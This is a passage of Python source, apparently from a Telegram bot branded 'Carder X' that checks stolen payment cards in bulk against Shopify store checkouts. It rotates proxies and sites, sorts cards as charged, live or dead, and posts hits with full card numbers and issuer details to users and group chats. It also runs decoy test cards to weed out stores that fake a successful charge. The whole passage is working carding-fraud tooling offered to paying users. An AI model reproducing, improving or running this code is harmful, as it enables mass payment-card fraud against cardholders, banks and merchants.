    if len(parts) >= 1:
        cc = parts[0]
        parts[0] = "x" * (len(cc) - 4) + cc[-4:] if len(cc) > 4 else "x" * len(cc)
    for idx in range(1, len(parts)):
        parts[idx] = "x" * len(parts[idx])
    masked_cc = "|".join(parts)

    masked_site = "******.com"

    if hit_type == "CHARGED":
        status_text = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
    else:
        status_text = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

    caption = (
        f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {status_text}\n"
        f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <b>{gateway_display}</b>\n"
        f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{safe_response}</b>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CARDER X", url="https://t.me/zlatanchecker_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
    ])

    try:
        await safe_send_message(bot,
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
        )
    except Exception as e:
        logging.error(f"Error sending hit log: {e}")

async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, send_to_extra: bool = True):
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} USD")
    safe_response = html_escape(str(response_msg))
    safe_proxy = str(proxy_status_formatted)
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = '<a href="https://t.me/Lanxo2">Carder X</a>'
    user_display = f"{user_link} ({plan_name})"

    caption = (
        f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"<tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗮𝗿𝗱 ➛ <code>{html_escape(cc_formatted)}</code>\n"
        f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <b>{gateway_display}</b>\n"
        f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{safe_response}</b>\n"
        f"<tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
        f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
        f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
    )


    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CARDER X", url="https://t.me/zlatanchecker_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
    ])

    try:
        await safe_send_animation(bot, 
            chat_id=user_obj.id,
            animation=gif_url,
            caption=caption,
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    except TelegramForbiddenError as e:
        logging.warning(f"[MSH] Could not DM approved hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending approved message to DM with animation: {e}. Falling back to text.")
        try:
            await safe_send_message(bot, 
                chat_id=user_obj.id,
                text=caption,
                parse_mode="HTML",
                reply_markup=reply_markup,
                
            )
        except Exception as inner_e:
            logging.error(f"Error sending approved text DM: {inner_e}")

    if not send_to_extra:
        return

    for target_chat in EXTRA_CHARGED_GROUP_IDS:
        curr_caption = caption
        try:
            await safe_send_animation(bot, 
                chat_id=target_chat,
                animation=gif_url,
                caption=curr_caption,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        except Exception as e:
            logging.error(f"Error sending APPROVED HIT to extra group {target_chat} with animation: {e}. Falling back to text.")
            try:
                await safe_send_message(bot, 
                    chat_id=target_chat,
                    text=curr_caption,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                
                )
            except Exception as inner_e:
                logging.error(f"Error sending APPROVED HIT text to extra group {target_chat}: {inner_e}")

async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name) -> bool:
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} USD")
    safe_response = html_escape(str(response_msg))
    safe_proxy = str(proxy_status_formatted)
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = '<a href="https://t.me/Lanxo2">Carder X</a>'
    user_display = f"{user_link} ({plan_name})"

    caption = (
        f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji>\n"
        f"<tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗮𝗿𝗱 ➛ <code>{html_escape(cc_formatted)}</code>\n"
        f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <b>{gateway_display}</b>\n"
        f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{safe_response}</b>\n"
        f"<tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_scheme}</b>\n"
        f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_bank}</b>\n"
        f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_country}</b>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_display}\n"
        f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> 𝗗𝗲𝘃 ➛ {dev_link} / <tg-emoji emoji-id='5399913388845322366'>📡</tg-emoji> 𝗣𝗿𝗼𝘅𝘆 ➛ {safe_proxy}"
    )


    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Carder X", url="https://t.me/zlatanchecker_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
    ])

    try:
        await safe_send_animation(bot, 
            chat_id=user_obj.id,
            animation=gif_url,
            caption=caption,
            parse_mode="HTML",
            reply_markup=reply_markup
        )
    except TelegramForbiddenError as e:
        logging.warning(f"[MSH] Could not DM charged hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending charged DM with animation: {e}. Falling back to text.")
        try:
            await safe_send_message(bot, 
                chat_id=user_obj.id,
                text=caption,
                parse_mode="HTML",
                reply_markup=reply_markup,
                
            )
        except Exception as inner_e:
            logging.error(f"Error sending charged text DM: {inner_e}")

    sent_to_extra = False
    for target_chat in EXTRA_CHARGED_GROUP_IDS:
        curr_caption = caption
        try:
            await safe_send_animation(bot, 
                chat_id=target_chat,
                animation=gif_url,
                caption=curr_caption,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            sent_to_extra = True
        except Exception as e:
            logging.error(f"Error sending HIT to extra group {target_chat} with animation: {e}. Falling back to text.")
            try:
                await safe_send_message(bot, 
                    chat_id=target_chat,
                    text=curr_caption,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                
                )
                sent_to_extra = True
            except Exception as inner_e:
                logging.error(f"Error sending HIT text to extra group {target_chat}: {inner_e}")

    return sent_to_extra

def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboardMarkup:
    session = MSH_SESSIONS.get(session_id, {})
    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)
    
    if isinstance(approved_count, list): approved_count = len(approved_count)
    if isinstance(dead_count, list): dead_count = len(dead_count)
    if isinstance(charged_count, list): charged_count = len(charged_count)
    
    if "msh" in ("mst", "mstr"):
        error_count = session.get('errors', 0)
        if isinstance(error_count, list): error_count = len(error_count)
        all_count = charged_count + approved_count + dead_count + error_count
    else:
        all_count = session.get('checked', 0)
        if isinstance(all_count, list): all_count = len(all_count)

    buttons = []
    buttons.append([
        InlineKeyboardButton(
            text=f"Lɪᴠᴇ ({approved_count})",
            callback_data=MshResultCallback(session_id=session_id, result_type="live").pack(),
            style="success",
            icon_custom_emoji_id=BTN_LIVE_EMOJI_ID
        ),
        InlineKeyboardButton(
            text=f"Dᴇᴀᴅ ({dead_count})",
            callback_data=MshResultCallback(session_id=session_id, result_type="dead").pack(),
            style="danger",
            icon_custom_emoji_id=BTN_DEAD_EMOJI_ID
        )
    ])
    buttons.append([
        InlineKeyboardButton(
            text=f"Cʜ𝗮𝗿𝗴𝗲𝗱 ({charged_count})",
            callback_data=MshResultCallback(session_id=session_id, result_type="charged").pack(),
            style="primary",
            icon_custom_emoji_id=BTN_CHARGED_EMOJI_ID
        ),
        InlineKeyboardButton(
            text=f"Aʟ𝗹 ({all_count})",
            callback_data=MshResultCallback(session_id=session_id, result_type="all").pack(),
            icon_custom_emoji_id=BTN_ALL_EMOJI_ID
        )
    ])

    if is_running:
        buttons.append([
            InlineKeyboardButton(
                text="Sᴛᴏ𝗽 Cʜ𝗲𝗰𝗸𝗶𝗻𝗴",
                callback_data=MshStopCallback(session_id=session_id).pack(),
                style="danger",
                icon_custom_emoji_id=BTN_STOP_EMOJI_ID
            )
        ])

    return InlineKeyboardMarkup(inline_keyboard=buttons)

async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"

    if not is_finished and not is_stopped and (current_time - last_update) < 3.5:
        return

    elapsed = current_time - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    status_icon = "<tg-emoji emoji-id='5269531045165816230'>🔄</tg-emoji>" if session['status'] == "CHECKING" else (f"<tg-emoji emoji-id=\"{BTN_STOP_EMOJI_ID}\">🛑</tg-emoji>" if session['status'] == "STOPPED" else "<tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji>")
    status_text = session['status']
    if status_text == "CHECKING": status_text = f"<i>{status_text}</i>"
    elif status_text == "STOPPED": status_text = f"<b>{status_text}</b>"
    elif status_text == "FINISHED": status_text = f"<b>{status_text}</b>"

    proxy_manager = session.get('proxy_manager')
    proxy_info = ""
    if proxy_manager:
        stats = proxy_manager.get_stats()
        proxy_info = f"\n<b>𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ➛</b> <code>{stats['active']}/{stats['total_proxies']} active</code>"

    text = (
        f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n"
        f"<b><tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> {status_text} {status_icon}\n"
        f"<b><tg-emoji emoji-id='5388632425314140043'>🔍</tg-emoji> 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>{session['checked']}/{session['total']}</code>\n"
        f"<b><tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>{session['approved']}</b>\n"
        f"<b><tg-emoji emoji-id='5436113877181941026'>🔥</tg-emoji> 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>{session['charged']}</b>\n"
        f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>{session['dead']}</b>\n"
        f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>{session['errors']}</b>\n"
        f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed_str}</b>\n"
        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/Lanxo2'>Carder X</a>\n"
        f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
    )

    if session.get('last_text') == text:
        return

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running = session['status'] == "CHECKING"
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'],
                message_id=session['msg_id'],
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            session['last_text'] = text
            session['last_update_time'] = current_time
        except TelegramBadRequest as e:
            error_msg = str(e).lower()
            if "message is not modified" not in error_msg and "message to edit not found" not in error_msg:
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    if is_session_stopped(session_id):
        return

    is_group = session.get('is_group', False)

    sites_list = session.get('sites_list') or get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty — no sites available for session {session_id}")
        session['errors'] += 1
        session['checked'] += 1
        if session['checked'] % 3 == 0 or session['checked'] == session['total']:
            await update_progress_message(bot, session_id)
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager found for session {session_id}")
        session['errors'] += 1
        session['checked'] += 1
        if session['checked'] % 3 == 0 or session['checked'] == session['total']:
            await update_progress_message(bot, session_id)
        return

    DECLINED_RESPONSES = [
        'CARD_DECLINED', 'PROCESSING_ERROR',
        'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR',
        'UNKNOWN_ERROR', 'Processing Error',
        'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
        'FRAUD_SUSPECTED',
        'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
        'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
        'INCORRECT_NUMBER', 'EXPIRED_CARD'
    ]

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = "Unknown 🔴"
    bin_data = {}
    used_proxy = None

    is_insufficient = False

    MAX_RETRIES = 15
    attempt = 0

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    while attempt < MAX_RETRIES:
        if is_session_stopped(session_id):
            return

        attempt += 1

        proxy_result = proxy_manager.get_next_proxy()

        if not proxy_result:
            logging.error(f"[MSH] No proxies available for session {session_id}")
            session['errors'] += 1
            session['checked'] += 1
            if session['checked'] % 3 == 0 or session['checked'] == session['total']:
                await update_progress_message(bot, session_id)
            return

        proxy, is_rotated = proxy_result
        used_proxy = proxy

        if is_session_stopped(session_id):
            return

        blacklisted = GLOBAL_BLACKLISTED_SITES | session.get('_blacklisted_sites', set())
        clean_sites = [s for s in sites_list if s not in blacklisted]
        if not clean_sites:
            logging.warning("[MSH] All sites blacklisted! Using full list.")
            clean_sites = sites_list
        site = random.choice(clean_sites)

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy
            )

            if is_session_stopped(session_id):
                return

            if "live" in str(proxy_status_raw).lower():
                proxy_status_formatted = "Live <tg-emoji emoji-id='5039793437776282663'>🟢</tg-emoji>"
            else:
                proxy_status_formatted = "Dead 🔴"

            api_price = price

            proxy_manager.report_result(proxy, message, http_status)

            message_upper = message.upper()
            message_lower = message.lower()
            is_charged_response = any(k in message_upper for k in ["ORDER_PLACED", "CHARGED", "THANK YOU"])

            if is_charged_response:
                logging.info(f"[MSH] Potential CHARGED on {site}. Running multi-card verification...")

                FAKE_CARDS = [
                    {"cc": "4003035140199121", "mes": "11", "ano": "2029", "cvv": "470"},
                    {"cc": "4400666318254873", "mes": "03", "ano": "2027", "cvv": "336"},
                    {"cc": "4921811566378291", "mes": "08", "ano": "2028", "cvv": "999"},
                    {"cc": "4226738291029281", "mes": "12", "ano": "2030", "cvv": "001"}
                ]

                if '_blacklisted_sites' not in session:
                    session['_blacklisted_sites'] = set()

                if site in session.get('_blacklisted_sites', set()):
                    logging.info(f"[MSH] Site {site} already blacklisted. Skipping...")
                    if attempt < MAX_RETRIES:
                        await asyncio.sleep(0.1)
                        continue
                    else:
                        result_status = "ERROR"
                        response_msg = "Site Error (Blacklisted Fake Site)"
                        break

                async def _verify_fake(fake_card):
                    try:
                        success, fmsg, _, _, _, _, _, _ = await process_card_api(
                            cc=fake_card["cc"], mes=fake_card["mes"],
                            ano=fake_card["ano"], cvv=fake_card["cvv"],
                            site=site, proxy=proxy
                        )
                        fmsg_up = fmsg.upper()
                        return any(k in fmsg_up for k in ["ORDER_PLACED", "CHARGED", "THANK YOU", "SUCCESS",  "PAID", "APPROVED"])
                    except Exception:
                        return False

                fake_results = await asyncio.gather(
                    *[_verify_fake(fc) for fc in FAKE_CARDS],
                    return_exceptions=True
                )

                fake_charged = sum(1 for r in fake_results if r is True)

                if fake_charged >= 1:
                    session.setdefault('_blacklisted_sites', set()).add(site)
                    GLOBAL_BLACKLISTED_SITES.add(site)
                    _save_to_blacklist(site)
                    
                    print(f"\033[91m[ALERT] FAKE CHARGED DETECTION SYSTEM SYSTEM ON: {site} ({fake_charged}/4 fake cards passed!)\033[0m")
                    
                    try:
                        sites_file = os.path.join(os.path.dirname(__file__), "sites.txt")
                        if os.path.exists(sites_file):
                            with open(sites_file, "r", encoding="utf-8") as rf:
                                current_active_sites = [line.strip() for line in rf if line.strip()]
                            updated_active_sites = [s for s in current_active_sites if s != site]
                            with open(sites_file, "w", encoding="utf-8") as wf:
                                for s in updated_active_sites:
                                    wf.write(f"{s}\n")
                            print(f"\033[93m[REMOVED] Site {site} instantly removed from active sites.txt!\033[0m")
                            logging.info(f"[MSH] Successfully removed fake site from sites.txt: {site}")
                    except Exception as fe:
                        logging.error(f"[MSH] Error removing fake site from file: {fe}")

                    logging.warning(
                        f"[MSH] <tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> FAKE SITE PERMANENTLY BLACKLISTED & REMOVED: {site} "
                        f"({fake_charged}/4 fake cards charged)"
                    )
                    if attempt < MAX_RETRIES:
                        await asyncio.sleep(0.1)
                        continue
                    else:
                        result_status = "ERROR"
                        response_msg = f"Site Error (Fake Charge - {fake_charged}/4 fakes passed)"
                        break
                else:
                    print(f"\033[92m[LEGIT] REAL CHARGE CONFIRMED on {site}! All 4 verification cards declined.\033[0m")
                    logging.info(
                        f"[MSH] <tg-emoji emoji-id='5341715473882955310'>✅</tg-emoji> REAL CHARGE CONFIRMED on {site}! "
                        f"All 4 fake cards declined. Charge is legit."
                    )
                    result_status = "CHARGED"
                    response_msg = message
                    break

            elif any(k in message_upper for k in INSUFFICIENT_FUNDS_KEYWORDS):
                result_status = "APPROVED"
                response_msg = message
                is_insufficient = True
                logging.info(f"[MSH] INSUFFICIENT FUNDS matched: {message!r}")
                break

            elif any(k in message_upper for k in OTHER_LIVE_KEYWORDS):
                result_status = "APPROVED"
                response_msg = message
                is_insufficient = False
                logging.info(f"[MSH] LIVE (non-insufficient) approved: {message!r}")
                break

            elif any(declined.upper() in message_upper for declined in DECLINED_RESPONSES):
                result_status = "DEAD"
                response_msg = message
                break

            else:
                is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)

                if is_proxy_error:
                    if attempt >= MAX_RETRIES:
                        result_status = "ERROR"
                        response_msg = f"Proxy Error: {message}"
                        break
                    else:
                        await asyncio.sleep(0.1)
                        continue
                else:
                    session.setdefault('_blacklisted_sites', set()).add(site)

                    is_rate_limit = any(rl in message_lower for rl in ["429", "too many requests", "http 429", "generic_error", "generic error", "throttled"])
                    if is_rate_limit:
                        attempt = max(0, attempt - 1)
                        await asyncio.sleep(0.3)

                    if attempt < MAX_RETRIES:
                        logging.info(
                            f"[MSH] Site {site} failed ({message[:50]}...) - "
                            f"retrying with new site ({attempt}/{MAX_RETRIES})"
                        )
                        await asyncio.sleep(0.05)
                        continue
                    else:
                        result_status = "ERROR"
                        response_msg = f"Site Error (retried {MAX_RETRIES}x): {message}"
                        break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)

            if attempt == MAX_RETRIES:
                result_status = "ERROR"
                response_msg = "Connection Error"
                proxy_status_formatted = "Error 🔴"
                break
            else:
                await asyncio.sleep(0.1)
                continue

    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    session['checked'] += 1

    if is_session_stopped(session_id):
        return

    print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")

    card_result_data = {
        'card': cc_formatted,
        'response': response_msg,
        'bin_info': bin_data,
        'price': api_price,
        'gateway': 'Shopify',
        'timestamp': datetime.now().isoformat(),
        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A'
    }

    if is_session_stopped(session_id):
        return

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        sent_to_extra = await send_charged_msg_to_user(
            bot, cc_formatted, response_msg, bin_data,
            proxy_status_formatted, api_price, user_obj, plan_name
        )

        asyncio.create_task(
            send_hit_log_to_group(
                bot, cc_formatted, response_msg, bin_data, user_obj,
                plan_name, proxy_status_formatted, api_price, site, "CHARGED"
            )
        )

        if sent_to_extra:
            await asyncio.gather(
                asyncio.to_thread(update_user_stats, user_id, True),
                asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name),
            )
        else:
            logging.warning(
                f"[MSH] CHARGED on {site} but delivery to extra groups failed — "
                f"counting as hit only, not as a charge."
            )
            await asyncio.to_thread(update_user_stats, user_id, False)

    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, True),
        )

        if is_insufficient:
            logging.info(f"[MSH] Sending INSUFFICIENT DM + log for {cc_formatted} — {response_msg!r}")
            await asyncio.gather(
                send_hit_log_to_group(bot, cc_formatted, response_msg, bin_data,
                                      user_obj, plan_name, proxy_status_formatted,
                                      api_price, site, "APPROVED"),
                send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data,
                                          proxy_status_formatted, api_price,
                                          user_obj, plan_name, send_to_extra=False),
            )
        else:
            logging.info(f"[MSH] Approved but not insufficient — staying silent: {response_msg!r}")

    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, False),
        )
    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False)

    if is_session_stopped(session_id):
        return

    if session['checked'] % 3 == 0 or session['checked'] == session['total']:
        await update_progress_message(bot, session_id)

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No permission", show_alert=True)
            return


        count = 0
        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('live_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            await callback.answer(f"<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No {type_names.get(result_type, '')} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)

        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {"charged": "💎", "live": "🍾", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗔𝗹𝗹"}

        emoji = type_emojis.get(result_type, "📁")
        label = type_labels.get(result_type, "𝗔𝗹𝗹")

        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {label} {emoji}\n"
            f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <b>{total_count}</b>\n"
            f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀"
        )



        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id,
                document=document,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=user_msg_id
            )
        except TelegramBadRequest as e:
            err_lower = str(e).lower()
            if "message to reply not found" in err_lower or "reply message not found" in err_lower:
                try:
                    document.seek(0)
                except Exception:
                    document = types.BufferedInputFile(file=file_content, filename=filename)
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(f"<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except:
            pass

@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("<tg-emoji emoji-id='5456140674028019486'>🛑</tg-emoji> Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No permission", show_alert=True)
            return


        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "STOPPED"

        print(f"🛑 [MSH] Stop signal sent")
        logging.info(f"❌ [MSH] Stop signal sent")

        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("<tg-emoji emoji-id='5040030395416969985'>🚫</tg-emoji> Stopping...", show_alert=False)

        print(f"🚫 [MSH] Cancelled {cancelled_count} tasks")
        logging.info(f"❌ [MSH] Cancelled {cancelled_count} tasks")

        proxy_manager = session.get('proxy_manager')
        if proxy_manager:
